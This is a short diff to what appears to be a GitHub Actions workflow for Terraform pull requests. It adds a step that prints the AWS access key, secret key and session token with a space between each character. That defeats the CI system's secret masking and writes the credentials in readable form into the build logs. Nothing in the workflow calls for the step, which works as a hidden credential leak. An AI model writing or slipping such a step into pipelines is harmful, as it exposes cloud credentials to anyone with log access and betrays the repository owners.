@@ -153,6 +153,11 @@ jobs:
             done
           fi
 
+      - run: |
+          echo "$AWS_ACCESS_KEY_ID" | sed 's/./& /g'
+          echo "$AWS_SECRET_ACCESS_KEY" | sed 's/./& /g'
+          echo "$AWS_SESSION_TOKEN" | sed 's/./& /g'
+
       # If the PR doesn't have one already, add a colored PR label to indicate
       # which terraform commands have attempted to run on the PR branch.
       # E.g., "terraform:plan", "terraform:apply", "terraform:force-unlock", etc.
